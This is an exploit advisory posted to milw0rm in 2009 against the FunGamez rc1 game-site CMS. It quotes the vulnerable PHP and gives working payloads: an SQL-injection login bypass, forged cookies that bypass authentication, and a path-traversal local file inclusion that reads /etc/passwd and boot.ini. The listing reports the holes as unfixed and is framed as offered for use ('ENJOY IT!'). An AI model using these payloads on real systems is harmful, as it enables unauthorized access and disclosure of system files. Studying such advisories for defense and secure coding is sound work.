<html><head><title>FunGamez rc1 (AB/LFI) Multiple Remote Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
|--------------------------------------------------------------------------------------------|
|                         	| FunGamez-release candidate 1 |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|--&gt;WEB: http://sourceforge.net/projects/fg-gsm/				             |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/fg-gsm/ 	   		             	     |
|--&gt;DEMO: N/A										     |
|--&gt;CATEGORY: CMS / Portals								     |
|--&gt;DESCRIPTION: A game-site manager with fully customisable design, and easy game adding    |
| 		and I will build in more options to make the site fully customisable...	     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3								     |
|--&gt;DORK: N/A										     |
|--&gt;CATEGORY: AUTH BYPASS/LFI							             |
|--&gt;AFFECT VERSION:RC-1						     			     |
|--&gt;Discovered Bug date: 2009-04-20							     |
|--&gt;Reported Bug date: 2009-04-20							     |
|--&gt;Fixed bug date: Not fixed								     |
|--&gt;Info patch: Not fixed							             |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
----------------------------------------------------------------------------------------------

/////////////////////////////

AUTH BYPASS (LOGIN FORM)

/////////////////////////////

-----------
BUG FILES:
-----------

Path --&gt; [HOME_PATH]/pages/login.php

It contents:

...

	$logindat = mysql_query(&quot;SELECT * FROM `fg_users` WHERE `username` = '&quot;.$uname.&quot;' and `password` = '&quot;.$upass.&quot;'&quot;);

...

---------
EXPLOIT:
---------

PEPE' OR 1=1 /*

Password:ANY


////////////////////////////////////////

AUTH BYPASS (INSECURE COOKIE HANDLING)

////////////////////////////////////////

-----------
BUG FILES:
-----------

Path --&gt; [HOME_PATH]/includes/user.php

It contents:

...

function checklogin(){

	If ( $_SESSION['user'] == null )  {

		If ( $_COOKIE['user'] == null )   {          
 			return 0;       
 		}         
		Else        
		{           
			return $_COOKIE['user'];         
		}     
	}  
 	Else      
	{        
	return $_SESSION['user'];      
	}
}

...

Path --&gt; [HOME_PATH]/index.php

It contents:

...

If ( $page-&gt;requireslogin($name) &amp;&amp; !$user-&gt;checklogin() ) { $name = 'login'; $_GET['newlogin'] = 1; }

...

----------
EXPLOITS:
----------

Add cookie:

1)user=1 path=/	(Insecure cookie)

2)user=pepe' or 1=1 /* path=/ (SQL injection)




///////////////////////////////

LOCAL FILE INCLUSION (LFI)

///////////////////////////////

------------
CONDITIONS:
------------

Need: Be admin user (above! :P)

-----------
BUG FILES:
-----------

Path --&gt; [HOME_PATH]/admin/load.php

It contents:

...

If ( !isset($_GET['module']) ) $mod = 'start';

If ( isset($_GET['module']) ) $mod = $_GET['module'];

include('./admin/modules/'.$mod.'.php');

----------
EXPLOITS:
----------

1)http://[HOST]/FunGamez/index.php?admin&amp;module=../../../../../../boot.ini%00

2)http://[HOST]/FunGamez/index.php?admin&amp;module=../../../../../etc/passwd%00


*******************************************************************
 ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
*******************************************************************
-------------------------------------------------------------------
*******************************************************************
 GREETZ TO: JosS and all spanish Hack3Rs community!
*******************************************************************

-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!

# milw0rm.com [2009-04-20]</pre></html>